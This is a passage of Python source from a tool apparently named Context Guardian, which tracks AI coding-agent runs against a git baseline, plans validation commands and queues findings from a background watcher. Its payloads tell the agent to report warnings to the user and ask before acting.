    if profile is not None:
        commands: list[str] = []
        cmd_block = profile.get("commands") if isinstance(profile.get("commands"), dict) else {}
        commands.extend(cmd_block.get("quick", []))
        commands.extend(cmd_block.get("full", []))
        for feature in profile.get("features", []):
            commands.extend(feature.get("validation", []))
        for item in missing_package_scripts(project, list(dict.fromkeys(commands))):
            findings.append({"code": "missing-package-script", **item})
        for command in dict.fromkeys(commands):
            safety = command_safety(command, profile, project)
            if safety["tier"] != "safe":
                findings.append({"code": f"command-{safety['tier']}", "command": command, "reasons": safety["reasons"]})
        referenced = list(profile.get("global_invariants", []))
        for feature in profile.get("features", []):
            referenced.extend(feature.get("references", []))
            referenced.extend(feature.get("invariants", []))
        for ref in dict.fromkeys(referenced):
            if not (project / ref).is_file():
                findings.append({"code": "missing-reference-file", "path": ref})

    tracked_state = git_output(
        project, ["ls-files", "--", ".app-context/runs", ".app-context/findings.json", ".app-context/watcher.json"]
    )
    if tracked_state:
        findings.append(
            {
                "code": "runtime-state-tracked-by-git",
                "count": len(tracked_state),
                "action": "git rm -r --cached .app-context/runs .app-context/findings.json .app-context/watcher.json",
            }
        )

    changes = [a for a in actions if a.get("change") not in ("unchanged", "not-installed", "skipped")]
    return {
        "status": "ok",
        "project": str(project),
        "dry_run": dry_run,
        "changes_pending" if dry_run else "changes_applied": len(changes),
        "actions": actions,
        "findings": findings,
    }


def compact_report(
    project: Path,
    profile: dict[str, Any],
    files: list[str],
    *,
    map_data: dict[str, Any] | None = None,
    map_status: str | None = None,
    depth: int = 3,
    validation_level: str = "quick",
) -> dict[str, Any]:
    features_by_id = {f["id"]: f for f in profile.get("features", [])}
    selected_by_id: dict[str, dict[str, Any]] = {}
    references: set[str] = set(profile.get("global_invariants", []))
    validation: set[str] = set()

    for feature in profile.get("features", []):
        matched = sorted(
            path
            for path in files
            if any(path_matches(path, pattern) for pattern in feature.get("triggers", []))
        )
        if not matched:
            continue
        selected_by_id[feature["id"]] = {
            "id": feature["id"],
            "matched_by": ["trigger"],
            "matched_count": len(matched),
            "matched_files": matched[:FEATURE_MATCH_LIMIT],
            "matched_files_truncated": len(matched) > FEATURE_MATCH_LIMIT,
            "impact_hop": 0,
            "impact_reasons": [],
        }
        references.update(feature.get("references", []))
        references.update(feature.get("invariants", []))
        validation.update(feature.get("validation", []))

    impact_summary: dict[str, Any] | None = None
    impacted_file_paths: list[str] = []
    impacted_symbol_names: list[str] = []

    freshness = None
    impact_result: dict[str, Any] = {}
    if map_data is not None:
        actual_map_status = "loaded"
        freshness = check_map_freshness(project, map_data)
        if not freshness["is_fresh"]:
            actual_map_status = "stale"
        if not files:
            impact_summary = {
                "seed_count": 0,
                "visited_node_count": 0,
                "impacted_node_count": 0,
                "depth_reached": 0,
            }
        else:
            impact_result = impact_application_map(
                map_data,
                paths=files,
                symbols=[],
                depth=depth,
                direction="dependents",
                edge_kinds=None,
            )
            impact_summary = {
                "seed_count": impact_result["seed_count"],
                "visited_node_count": impact_result["visited_node_count"],
                "impacted_node_count": impact_result["impacted_node_count"],
                "depth_reached": impact_result["depth_reached"],
            }
            for node in impact_result.get("nodes", []):
                node_id = str(node.get("id", ""))
                if node.get("kind") == "feature" or node_id.startswith("feature:"):
                    feature_id = node_id.split(":", 1)[1] if ":" in node_id else node_id
                    feat_def = features_by_id.get(feature_id)
                    hop = node.get("impact_hop", 0)
                    reasons = node.get("impact_reasons", [])
                    if feature_id in selected_by_id:
                        entry = selected_by_id[feature_id]
                        if "impact" not in entry["matched_by"]:
                            entry["matched_by"].append("impact")
                        if entry.get("impact_hop", 0) == 0 or hop < entry.get("impact_hop", 0):
                            entry["impact_hop"] = hop
                            entry["impact_reasons"] = reasons
                    else:
                        selected_by_id[feature_id] = {
                            "id": feature_id,
                            "matched_by": ["impact"],
                            "matched_count": 0,
                            "matched_files": [],
                            "matched_files_truncated": False,
                            "impact_hop": hop,
                            "impact_reasons": reasons,
                        }
                        if feat_def:
                            references.update(feat_def.get("references", []))
                            references.update(feat_def.get("invariants", []))
                            validation.update(feat_def.get("validation", []))

            changed_set = set(files)
            impacted_file_paths = sorted(
                {
                    node["path"]
                    for node in impact_result.get("nodes", [])
                    if node.get("kind") == "file"
                    and node.get("path")
                    and node["path"] not in changed_set
                }
            )
            impacted_symbol_names = sorted(
                {
                    node["name"]
                    for node in impact_result.get("nodes", [])
                    if node.get("kind") == "symbol"
                    and not node.get("is_seed")
                    and node.get("name")
                }
            )
    else:
        actual_map_status = map_status or "not-found"

    # Transitive feature dependency selection
    dep_queue = list(selected_by_id.keys())
    visited_deps = set(dep_queue)
    while dep_queue:
        current_fid = dep_queue.pop(0)
        current_def = features_by_id.get(current_fid)
        if not current_def:
            continue
        for dep_id in current_def.get("depends_on", []):
            dep_def = features_by_id.get(dep_id)
            if not dep_def:
                continue
            if dep_id in selected_by_id:
                entry = selected_by_id[dep_id]
                if "dependency" not in entry["matched_by"]:
                    entry["matched_by"].append("dependency")
            else:
                selected_by_id[dep_id] = {
                    "id": dep_id,
                    "matched_by": ["dependency"],
                    "matched_count": 0,
                    "matched_files": [],
                    "matched_files_truncated": False,
                    "impact_hop": selected_by_id[current_fid].get("impact_hop", 0) + 1,
                    "impact_reasons": [f"depends on feature {current_fid}"],
                }
                references.update(dep_def.get("references", []))
                references.update(dep_def.get("invariants", []))
                validation.update(dep_def.get("validation", []))
            if dep_id not in visited_deps:
                visited_deps.add(dep_id)
                dep_queue.append(dep_id)

    selected_features = sorted(
        selected_by_id.values(),
        key=lambda item: (
            0 if "trigger" in item["matched_by"] else 1,
            item.get("impact_hop", 0),
            item["id"],
        ),
    )

    commands = profile.get("commands", {}) if isinstance(profile.get("commands"), dict) else {}
    quick_cmds = commands.get("quick", [])
    full_cmds = commands.get("full", [])

    # Validation planning
    validation_plan: list[dict[str, str]] = []
    seen_plan_cmds: set[str] = set()

    if validation_level in ("quick", "all"):
        for cmd in quick_cmds:
            if cmd not in seen_plan_cmds:
                validation_plan.append(
                    {
                        "command": cmd,
                        "source": "global-quick",
                        "level": "quick",
                        "safety": command_safety(cmd, profile, project),
                    }
                )
                seen_plan_cmds.add(cmd)
    if validation_level in ("full", "all"):
        for cmd in full_cmds:
            if cmd not in seen_plan_cmds:
                validation_plan.append(
                    {
                        "command": cmd,
                        "source": "global-full",
                        "level": "full",
                        "safety": command_safety(cmd, profile, project),
                    }
                )
                seen_plan_cmds.add(cmd)

    for feat in selected_features:
        feat_id = feat["id"]
        feat_def = features_by_id.get(feat_id, {})
        for cmd in feat_def.get("validation", []):
            if cmd not in seen_plan_cmds:
                validation_plan.append(
                    {
                        "command": cmd,
                        "source": f"feature:{feat_id}",
                        "level": "feature",
                        "safety": command_safety(cmd, profile, project),
                    }
                )
                seen_plan_cmds.add(cmd)

    report: dict[str, Any] = {
        "status": "ok",
        "project": str(project),
        "app_id": profile["app_id"],
        "map_status": actual_map_status,
        "changed_count": len(files),
        "changed_files": files[:REPORT_PATH_LIMIT],
        "changed_files_truncated": len(files) > REPORT_PATH_LIMIT,
        "selected_features": selected_features,
        "read": sorted(references),
        "feature_validation": sorted(validation),
        "quick_commands": quick_cmds,
        "validation_level": validation_level,
        "validation_plan": validation_plan,
        "coverage_gap": bool(files and not selected_features),
    }

    if map_data is not None:
        report["map_freshness"] = freshness
        report["impact_summary"] = impact_summary
        nodes_truncated = bool(impact_result.get("nodes_truncated", False))
        report["impacted_file_count"] = len(impacted_file_paths)
        report["impacted_files"] = impacted_file_paths[:REPORT_PATH_LIMIT]
        report["impacted_files_truncated"] = (
            len(impacted_file_paths) > REPORT_PATH_LIMIT
            or (nodes_truncated and bool(impacted_file_paths))
        )
        report["impacted_symbol_count"] = len(impacted_symbol_names)
        report["impacted_symbols"] = impacted_symbol_names[:REPORT_PATH_LIMIT]
        report["impacted_symbols_truncated"] = (
            len(impacted_symbol_names) > REPORT_PATH_LIMIT
            or (nodes_truncated and bool(impacted_symbol_names))
        )

    twin_analysis = analyze_twin_synchronization(project, files, profile)
    report["twin_analysis"] = twin_analysis
    if twin_analysis["unsynchronized_count"] > 0:
        report["unsynchronized_twins"] = twin_analysis["unsynchronized_twins"]

    return report


def capture_baseline(project: Path) -> dict[str, Any]:
    commit = None
    try:
        commit_lines = git_output(project, ["rev-parse", "HEAD"])
        if commit_lines:
            commit = commit_lines[0]
    except Exception:
        pass

    dirty_tracked: list[str] = []
    try:
        dirty_tracked = sorted(
            p
            for p in set(git_output(project, ["diff", "--name-only", "HEAD"]))
            if _is_task_relevant_path(p)
        )
    except Exception:
        pass

    dirty_hashes: dict[str, str | None] = {}
    for path_str in dirty_tracked:
        full_path = project / path_str
        dirty_hashes[path_str] = _sha256_file(full_path)

    untracked: list[str] = []
    try:
        untracked = sorted(
            p
            for p in set(git_output(project, ["ls-files", "--others", "--exclude-standard"]))
            if _is_task_relevant_path(p)
        )
    except Exception:
        pass

    return {
        "commit": commit,
        "dirty_tracked": dirty_tracked,
        "dirty_hashes": dirty_hashes,
        "untracked": untracked,
        "captured_at": datetime.now(timezone.utc).isoformat(),
    }


def compute_task_delta(project: Path, baseline: dict[str, Any]) -> list[str]:
    try:
        current_dirty = {
            p
            for p in git_output(project, ["diff", "--name-only", "HEAD"])
            if _is_task_relevant_path(p)
        }
    except Exception:
        current_dirty = set()
    try:
        current_untracked = {
            p
            for p in git_output(project, ["ls-files", "--others", "--exclude-standard"])
            if _is_task_relevant_path(p)
        }
    except Exception:
        current_untracked = set()

    base_dirty = set(baseline.get("dirty_tracked", []))
    base_dirty_hashes = baseline.get("dirty_hashes", {})
    base_untracked = set(baseline.get("untracked", []))

    delta_files = set(current_untracked - base_untracked)
    delta_files.update(current_dirty - base_dirty)

    # A task may commit its work before the completion hook runs. Dirty-worktree
    # inspection alone would then incorrectly report an empty task delta.
    baseline_commit = baseline.get("commit")
    try:
        current_commit_lines = git_output(project, ["rev-parse", "HEAD"])
        current_commit = current_commit_lines[0] if current_commit_lines else None
    except Exception:
        current_commit = None

    if current_commit and baseline_commit and current_commit != baseline_commit:
        try:
            delta_files.update(
                p
                for p in git_output(
                    project, ["diff", "--name-only", f"{baseline_commit}..{current_commit}"]
                )
                if _is_task_relevant_path(p)
            )
        except Exception:
            pass
    elif current_commit and not baseline_commit:
        # Handle a repository whose first commit was created during the task.
        try:
            delta_files.update(
                p
                for p in git_output(project, ["ls-tree", "-r", "--name-only", current_commit])
                if _is_task_relevant_path(p)
            )
        except Exception:
            pass

    for path_str in current_dirty & base_dirty:
        current_hash = _sha256_file(project / path_str)
        if current_hash != base_dirty_hashes.get(path_str):
            delta_files.add(path_str)

    return sorted(delta_files)


def begin_run(
    project: Path,
    *,
    runtime: str | None = None,
    session_id: str | None = None,
    turn_id: str | None = None,
) -> dict[str, Any]:
    project = project.expanduser().resolve()
    if not project.is_dir():
        raise LifecycleError(f"project directory not found: {project}")
    run_id = f"run-{os.urandom(8).hex()}"
    baseline = capture_baseline(project)
    now = datetime.now(timezone.utc).isoformat()
    record = {
        "schema_version": 1,
        "run_id": run_id,
        "status": "ACTIVE",
        "runtime": runtime or "generic",
        "session_id": session_id,
        "turn_id": turn_id,
        "retry_count": 0,
        "created_at": now,
        "updated_at": now,
        "baseline": baseline,
    }
    runs_dir = project_write_path(project, RUNS_RELATIVE_PATH)
    runs_dir.mkdir(parents=True, exist_ok=True)
    run_file = project_write_path(project, runs_dir / f"{run_id}.json")
    run_file.write_text(json.dumps(record, indent=2), encoding="utf-8")
    try:
        prune_run_records(project, keep_path=run_file)
    except OSError:
        pass
    return {
        "status": "ok",
        "run_id": run_id,
        "run_status": "ACTIVE",
        "created_at": now,
        "baseline_summary": {
            "commit": baseline.get("commit"),
            "dirty_tracked_count": len(baseline.get("dirty_tracked", [])),
            "untracked_count": len(baseline.get("untracked", [])),
        },
    }


def prune_run_records(
    project: Path,
    *,
    now: float | None = None,
    retention_seconds: float = RUN_RETENTION_SECONDS,
    keep: int = RUN_RECORD_LIMIT,
    keep_path: Path | None = None,
) -> int:
    """Delete run and session records older than the retention window or past the cap."""
    try:
        runs_dir = project_write_path(project, RUNS_RELATIVE_PATH)
    except MapError:
        return 0  # a runs directory that leads out of the project is never pruned
    if not runs_dir.is_dir():
        return 0
    now = time.time() if now is None else now
    entries: list[tuple[float, Path]] = []
    for path in runs_dir.glob("*.json"):
        try:
            if path.is_file() and not path.is_symlink():
                entries.append((path.stat().st_mtime, path))
        except OSError:
            continue
    entries.sort(key=lambda item: item[0], reverse=True)
    removed = 0
    for index, (mtime, path) in enumerate(entries):
        if keep_path is not None and path == keep_path:
            continue
        if now - mtime > retention_seconds or index >= keep:
            try:
                path.unlink()
                removed += 1
            except OSError:
                pass
    return removed


def load_run(project: Path, run_id: str) -> dict[str, Any]:
    if not isinstance(run_id, str) or not re.match(r"^run-[a-zA-Z0-9_-]+$", run_id):
        raise LifecycleError(f"invalid run_id: {run_id}")
    run_file = project / RUNS_RELATIVE_PATH / f"{run_id}.json"
    if not run_file.is_file():
        raise LifecycleError(f"run record not found: {run_id}")
    try:
        return json.loads(run_file.read_text(encoding="utf-8"))
    except Exception as exc:
        raise LifecycleError(f"failed to read run record: {exc}") from exc


def save_run(project: Path, record: dict[str, Any]) -> None:
    run_id = record["run_id"]
    runs_dir = project_write_path(project, RUNS_RELATIVE_PATH)
    runs_dir.mkdir(parents=True, exist_ok=True)
    run_file = project_write_path(project, runs_dir / f"{run_id}.json")
    record["updated_at"] = datetime.now(timezone.utc).isoformat()
    run_file.write_text(json.dumps(record, indent=2), encoding="utf-8")


def get_run_status(project: Path, run_id: str) -> dict[str, Any]:
    record = load_run(project, run_id)
    delta = compute_task_delta(project, record["baseline"])
    return {
        "status": "ok",
        "run_id": run_id,
        "run_status": record.get("status", "ACTIVE"),
        "retry_count": record.get("retry_count", 0),
        "created_at": record.get("created_at"),
        "updated_at": record.get("updated_at"),
        "delta_files_count": len(delta),
        "delta_files": delta[:REPORT_PATH_LIMIT],
    }


def engine_command(subcommand: str, project: Path) -> str:
    """A copy-pasteable engine command that works from any directory."""
    return f"{CLI_COMMAND} {subcommand} --project {shlex.quote(str(project))}"


def _map_auto_refresh_enabled(project: Path) -> bool:
    try:
        profile = load_profile(project)
    except ProfileError:
        return True
    options = profile.get("map")
    if isinstance(options, dict) and options.get("auto_refresh") is False:
        return False
    return True


def refresh_map_if_stale(project: Path, map_path: Path = MAP_RELATIVE_PATH) -> dict[str, Any]:
    """Bring the generated map up to date. Generated data only; never curated files."""
    project = project.expanduser().resolve()
    target = map_path if map_path.is_absolute() else project / map_path
    if not target.is_file():
        return {"status": "absent"}
    if not _map_auto_refresh_enabled(project):
        return {"status": "disabled"}
    try:
        existing = load_application_map(project, map_path)
        freshness = check_map_freshness(project, existing)
        if freshness["is_fresh"]:
            return {"status": "fresh"}
        started = time.monotonic()
        refreshed = refresh_application_map(project, existing)
        write_application_map(project, refreshed, map_path)
        return {
            "status": "refreshed",
            "reasons": freshness["stale_reasons"],
            "seconds": round(time.monotonic() - started, 3),
        }
    except (MapError, OSError, ValueError) as exc:
        return {"status": "error", "error": str(exc)}


def evaluate_issues(
    project: Path,
    delta_files: list[str],
    *,
    map_path: Path = MAP_RELATIVE_PATH,
    validation_level: str = "quick",
) -> tuple[list[dict[str, Any]], list[dict[str, Any]], dict[str, Any] | None]:
    """Judge a set of changed files. The single source of truth for findings.

    Both the end-of-turn hook (`finish_run`) and the background watcher call
    this, so a finding means the same thing however it was noticed. It reads;
    it writes nothing and keeps no run state, which is what makes it safe to
    call on a timer from outside any conversation.
    """

    profile = None
    profile_error: str | None = None
    try:
        profile = load_profile(project)
    except ProfileError as error:
        # "Missing" and "malformed" send a person to two different places, so
        # they are not collapsed into one message. A profile that exists but does
        # not validate used to be reported as absent, which is a hunt for a file
        # that is sitting right there.
        profile_error = str(error) if (project / PROFILE_RELATIVE_PATH).is_file() else None

    map_data = None
    target_map = (project / map_path).resolve() if not map_path.is_absolute() else map_path.resolve()
    if target_map.is_file():
        try:
            map_data = load_application_map(project, map_path)
        except MapError:
            pass

    report = None
    if profile:
        report = compact_report(
            project,
            profile,
            delta_files,
            map_data=map_data,
            depth=3,
            validation_level=validation_level,
        )

    issues: list[dict[str, Any]] = []
    coverage_gaps: list[dict[str, Any]] = []

    if map_data is not None:
        # A map goes stale the moment any file is edited, so a stale map is the
        # normal state of every working tree. Raising it as a warning made every
        # edit end in a question to the user. It is recorded as lower routing
        # confidence instead; `finish` refreshes the map before evaluating, and
        # only a refresh that fails becomes an issue.
        freshness = check_map_freshness(project, map_data)
        if not freshness["is_fresh"]:
            coverage_gaps.append(
                {
                    "code": "stale-application-map",
                    "reasons": freshness["stale_reasons"],
                }
            )

    if profile_error:
        issues.append(
            {
                "code": "invalid-profile",
                "severity": "error",
                "message": f"Application profile is present but invalid: {profile_error}",
                "paths": [str(PROFILE_RELATIVE_PATH)],
                "action": "Fix .app-context/profile.json against references/profile-schema.md.",
            }
        )
        coverage_gaps.append({"code": "invalid-profile", "reason": profile_error})
    elif not profile and delta_files:
        issues.append(
            {
                "code": "missing-profile",
                "severity": "warning",
                "message": "Repository does not have an application profile (.app-context/profile.json)",
                "paths": delta_files[:REPORT_PATH_LIMIT],
                "action": "Create an application profile or inspect files directly.",
            }
        )
        coverage_gaps.append({"code": "missing-profile", "paths": delta_files[:REPORT_PATH_LIMIT]})
    elif report and report.get("coverage_gap"):
        issues.append(
            {
                "code": "unmapped-change",
                "severity": "warning",
                "message": "Task changes are not covered by any feature triggers or map nodes",
                "paths": delta_files[:REPORT_PATH_LIMIT],
                "action": "Inspect affected files directly or update feature triggers.",
            }
        )
        coverage_gaps.append({"code": "unmapped-change", "paths": delta_files[:REPORT_PATH_LIMIT]})

    if report:
        for plan_item in report.get("validation_plan", []):
            if plan_item.get("safety", {}).get("tier") == "disallowed":
                reasons_str = "; ".join(plan_item["safety"].get("reasons", []))
                issues.append(
                    {
                        "code": "disallowed-validation-command",
                        "severity": "error",
                        "message": f"Disallowed command in validation plan: {plan_item['command']} ({reasons_str})",
                        "paths": [],
                        "action": "Remove destructive, publishing, or dangerous operations from profile validation.",
                    }
                )
                coverage_gaps.append(
                    {
                        "code": "disallowed-validation-command",
                        "command": plan_item["command"],
                        "reasons": plan_item["safety"].get("reasons", []),
                    }
                )

    twin_analysis = analyze_twin_synchronization(project, delta_files, profile)
    for unsync in twin_analysis.get("unsynchronized_twins", []):
        issues.append(
            {
                "code": "unsynchronized-platform-twin",
                "severity": "warning",
                "message": unsync["message"],
                "paths": unsync["touched"] + unsync["untouched"],
                "action": "Synchronize counterpart platform file or declare intentional divergence in profile.json.",
            }
        )
        coverage_gaps.append(
            {
                "code": "unsynchronized-platform-twin",
                "twin_id": unsync["id"],
                "touched": unsync["touched"],
                "untouched": unsync["untouched"],
            }
        )

    return issues, coverage_gaps, report


def finish_run(
    project: Path,
    run_id: str,
    *,
    max_retries: int = DEFAULT_MAX_RETRIES,
    map_path: Path = MAP_RELATIVE_PATH,
    validation_level: str = "quick",
) -> dict[str, Any]:
    record = load_run(project, run_id)
    delta_files = compute_task_delta(project, record["baseline"])
    map_refresh = (
        refresh_map_if_stale(project, map_path) if delta_files else {"status": "skipped"}
    )
    issues, coverage_gaps, report = evaluate_issues(
        project, delta_files, map_path=map_path, validation_level=validation_level
    )
    if map_refresh.get("status") == "error":
        issues.append(
            {
                "code": "map-refresh-failed",
                "severity": "warning",
                "message": f"Application map could not be refreshed: {map_refresh.get('error')}",
                "paths": [],
                "action": f"Run `{engine_command('build-map', project)}` and check the error.",
            }
        )

    # A warning is something a person should hear about, not something an agent
    # should be forced to fix on its own. Only an error -- a validation command
    # that must not run at all -- is worth blocking a turn over. Everything else
    # is reported, and the agent is told to put it to the user first. Blocking on
    # warnings is what turned a stale map into a locked conversation.
    errors = [issue for issue in issues if issue.get("severity") == "error"]
    warnings = [issue for issue in issues if issue.get("severity") != "error"]
    current_retries = record.get("retry_count", 0)

    if not issues:
        decision = "allow"
        record["status"] = "CLEAN"
        summary = "Context Guardian found no actionable issue."
    elif errors and current_retries < max_retries:
        decision = "retry"
        record["retry_count"] = current_retries + 1
        record["status"] = "ACTIVE"
        summary = (
            f"{len(errors)} error-level issue(s) found. Retry recommended "
            f"(attempt {record['retry_count']}/{max_retries})."
        )
    elif errors:
        decision = "report"
        record["status"] = "UNRESOLVED"
        summary = f"Error-level issues remain unresolved after {current_retries} retries."
    else:
        decision = "report"
        record["status"] = "REPORTED"
        summary = (
            f"{len(warnings)} warning(s) for the user to decide on. "
            "Describe them and ask before changing anything."
        )

    save_run(project, record)

    return {
        "schema_version": 1,
        "run_id": run_id,
        "run_status": record["status"],
        "decision": decision,
        "retry_count": record.get("retry_count", 0),
        "summary": summary,
        # The agent is told, in the payload, what it is allowed to do with this.
        # A guardian that silently repairs things is a guardian the person cannot
        # audit, so a warning always routes through the user.
        "user_action_required": bool(warnings) and not errors,
        "agent_instruction": (
            "Describe these findings to the user in plain language and ask whether "
            "to fix them. Do not change anything on your own."
            if warnings and not errors
            else ""
        ),
        "error_count": len(errors),
        "warning_count": len(warnings),
        "changed_count": len(delta_files),
        "changed_files": delta_files[:REPORT_PATH_LIMIT],
        "issues": issues,
        "coverage_gaps": coverage_gaps,
        "selected_features": report.get("selected_features", []) if report else [],
        "read": report.get("read", []) if report else [],
        "feature_validation": report.get("feature_validation", []) if report else [],
        "quick_commands": report.get("quick_commands", []) if report else [],
        "validation_level": validation_level,
        "validation_plan": report.get("validation_plan", []) if report else [],
        "map_refresh": map_refresh,
        "truncated": False,
    }


def abort_run(project: Path, run_id: str, *, reason: str | None = None) -> dict[str, Any]:
    record = load_run(project, run_id)
    record["status"] = "ABORTED"
    record["abort_reason"] = reason or "user-aborted"
    save_run(project, record)
    return {
        "status": "ok",
        "run_id": run_id,
        "run_status": "ABORTED",
        "reason": record["abort_reason"],
    }


# ---------------------------------------------------------------------------
# Background watcher
#
# The hook design answers one question -- "is this turn finished cleanly?" --
# and it answers it inside the agent, which means every check is paid for in the
# agent's context. The watcher answers a different question: "has anything in
# this project gone wrong since I last looked?", and it answers it in a separate
# process on a timer.
#
# What that buys, precisely: detection costs the agent nothing. Scanning,
# diffing and twin comparison happen outside the conversation entirely. What it
# cannot buy is a free notification -- telling an agent something means putting
# words in its context, and words are tokens. So the watcher does all the
# looking and the hook says nothing at all unless the queue has something in it.
# A quiet project costs one file-existence check per turn.
# ---------------------------------------------------------------------------

FINDINGS_RELATIVE_PATH = Path(".app-context/findings.json")
WATCHER_RELATIVE_PATH = Path(".app-context/watcher.json")
DEFAULT_WATCH_INTERVAL = 20.0
MIN_WATCH_INTERVAL = 5.0
FINDINGS_HISTORY_LIMIT = 200


def finding_fingerprint(issue: dict[str, Any]) -> str:
    """Identify a finding by what it says, not when it was said.

    The same unsynchronised twin noticed on twelve consecutive scans is one
    finding, not twelve. Paths are part of the identity because the same code
    about different files is a different problem.
    """
    payload = json.dumps(
        {"code": issue.get("code"), "paths": sorted(issue.get("paths", []) or [])},
        sort_keys=True,
        ensure_ascii=False,
    )
    return hashlib.sha256(payload.encode("utf-8")).hexdigest()[:16]


def load_findings(project: Path) -> dict[str, Any]:
    path = project / FINDINGS_RELATIVE_PATH
    if not path.is_file():
        return {"schema_version": 1, "findings": []}
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return {"schema_version": 1, "findings": []}
    if not isinstance(data, dict) or not isinstance(data.get("findings"), list):
        return {"schema_version": 1, "findings": []}
    return data


def queue_findings(project: Path, issues: list[dict[str, Any]]) -> dict[str, Any]:
    """Add anything genuinely new to the queue. Returns what was added."""
    store = load_findings(project)
    known = {entry["fingerprint"]: entry for entry in store["findings"]}
    added: list[dict[str, Any]] = []
    now = datetime.now(timezone.utc).isoformat()

    for issue in issues:
        fingerprint = finding_fingerprint(issue)
        if fingerprint in known:
            known[fingerprint]["last_seen"] = now
            continue
        entry = {
            "fingerprint": fingerprint,
            "first_seen": now,
            "last_seen": now,
            "delivered": False,
            "issue": issue,
        }
        store["findings"].append(entry)
        known[fingerprint] = entry
        added.append(entry)

    store["findings"] = store["findings"][-FINDINGS_HISTORY_LIMIT:]
    store["updated_at"] = now
    _write_json_atomic(project_write_path(project, FINDINGS_RELATIVE_PATH), store)
    return {"added": added, "queued": [e for e in store["findings"] if not e["delivered"]]}


def drain_findings(project: Path, *, mark: bool = True) -> dict[str, Any]:
    """Hand over undelivered findings. This is the only thing the hook calls.

    `mark=False` peeks without consuming, which is what a person running the
    command by hand almost always wants.
    """
    store = load_findings(project)
    pending = [entry for entry in store["findings"] if not entry.get("delivered")]
    if mark and pending:
        for entry in pending:
            entry["delivered"] = True
        store["updated_at"] = datetime.now(timezone.utc).isoformat()
        _write_json_atomic(project_write_path(project, FINDINGS_RELATIVE_PATH), store)
    return {
        "status": "ok",
        "count": len(pending),
        "findings": [entry["issue"] for entry in pending],
        "fingerprints": [entry["fingerprint"] for entry in pending],
        "agent_instruction": (
            "Context Guardian noticed these while you were working. Describe them "
            "to the user in plain language and ask whether to fix them. Do not "
            "change anything on your own."
            if pending
            else ""
        ),
    }


def _worktree_signature(project: Path) -> str:
    """A cheap fingerprint of the working tree, to skip unchanged scans."""
    try:
        paths = changed_files(project, None)
    except Exception:
        return ""
    parts = []
    for path in paths:
        full = project / path
        try:
            stat = full.stat()
            parts.append(f"{path}:{int(stat.st_mtime)}:{stat.st_size}")
        except OSError:
            parts.append(f"{path}:missing")
    return hashlib.sha256("|".join(parts).encode("utf-8")).hexdigest()


def scan_once(
    project: Path,
    *,
    map_path: Path = MAP_RELATIVE_PATH,
    validation_level: str = "quick",
) -> dict[str, Any]:
    """One pass: look at the working tree, judge it, queue anything new."""
    delta_files = changed_files(project, None)
    issues, coverage_gaps, _report = evaluate_issues(
        project, delta_files, map_path=map_path, validation_level=validation_level
    )
    queued = queue_findings(project, issues)
    return {
        "status": "ok",
        "changed_count": len(delta_files),
        "issue_count": len(issues),
        "new_count": len(queued["added"]),
        "pending_count": len(queued["queued"]),
        "coverage_gaps": coverage_gaps,
    }


def watcher_state(project: Path) -> dict[str, Any]:
    path = project / WATCHER_RELATIVE_PATH
    if not path.is_file():
        return {"running": False}
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return {"running": False}
    pid = data.get("pid")
    data["running"] = _process_alive(pid) if isinstance(pid, int) and not isinstance(pid, bool) else False
    return data


def _process_alive(pid: int) -> bool:
    """Whether `pid` runs, without ever signalling it.

    The PID comes from a file inside the repository. `os.kill(pid, 0)` only
    probes on POSIX; on Windows any signal terminates the process.
    """
    if pid <= 0:
        return False
    if os.name == "nt":
        try:
            import ctypes

            kernel32 = ctypes.windll.kernel32  # type: ignore[attr-defined]
            handle = kernel32.OpenProcess(0x1000, False, pid)  # PROCESS_QUERY_LIMITED_INFORMATION
            if not handle:
                return False
            try:
                code = ctypes.c_ulong()
                return bool(kernel32.GetExitCodeProcess(handle, ctypes.byref(code))) and code.value == 259
            finally:
                kernel32.CloseHandle(handle)
        except Exception:
            return False
    try:
        os.kill(pid, 0)
        return True
    except PermissionError:
        return True  # exists, owned by someone else
    except OSError:
        return False


def watch_project(
    project: Path,
    *,
    interval: float = DEFAULT_WATCH_INTERVAL,
    iterations: int | None = None,
    map_path: Path = MAP_RELATIVE_PATH,
) -> dict[str, Any]:
    """Watch until interrupted. `iterations` bounds it, which is how it is tested.

    Polling rather than inotify/FSEvents on purpose: no third-party dependency,
    identical behaviour on macOS and Linux, and a scan is cheap enough that a
    20-second beat is invisible. A scan is skipped outright when the working
    tree's signature has not moved.
    """
    interval = max(float(interval), MIN_WATCH_INTERVAL)
    state_path = project_write_path(project, WATCHER_RELATIVE_PATH)
    _write_json_atomic(
        state_path,
        {
            "pid": os.getpid(),
            "interval": interval,
            "started_at": datetime.now(timezone.utc).isoformat(),
            "project": str(project),
        },
    )

    scans = 0
    new_total = 0
    last_signature: str | None = None
    try:
        while iterations is None or scans < iterations:
            signature = _worktree_signature(project)
            if signature != last_signature:
                last_signature = signature
                try:
                    outcome = scan_once(project, map_path=map_path)
                    new_total += outcome["new_count"]
                except Exception as error:
                    # A watcher that dies on one bad scan is worse than one that
                    # logs and keeps its beat.
                    queue_findings(
                        project,
                        [
                            {
                                "code": "watcher-scan-failed",
                                "severity": "warning",
                                "message": f"Context Guardian watcher could not scan: {error}",
                                "paths": [],
                                "action": "Inspect the project manually; the watcher is still running.",
                            }
                        ],
                    )
            scans += 1
            if iterations is not None and scans >= iterations:
                break
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    finally:
        try:
            state_path.unlink(missing_ok=True)
        except OSError:
            pass

    return {"status": "ok", "scans": scans, "new_findings": new_total}


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    subparsers = parser.add_subparsers(dest="command", required=True)

    inspect_parser = subparsers.add_parser("inspect", help="select context for current changes")
    inspect_parser.add_argument("--project", required=True, type=Path)
    inspect_parser.add_argument("--base", help="optional git base branch or revision")
    inspect_parser.add_argument("--map", dest="map_path", type=Path, default=MAP_RELATIVE_PATH)
    inspect_parser.add_argument("--no-map", action="store_true", help="skip graph impact traversal")
    inspect_parser.add_argument("--depth", type=int, default=3, help="impact traversal depth")
    inspect_parser.add_argument(
        "--validation-level",
        choices=("quick", "full", "all"),
        default="quick",
        help="validation planning level",
    )

    validate_parser = subparsers.add_parser(
        "validate-profile", help="validate one application profile"
    )
    validate_parser.add_argument("--project", required=True, type=Path)

    build_map_parser = subparsers.add_parser(
        "build-map", help="build a code-derived application map"
    )
    build_map_parser.add_argument("--project", required=True, type=Path)
    build_map_parser.add_argument("--output", type=Path, default=MAP_RELATIVE_PATH)

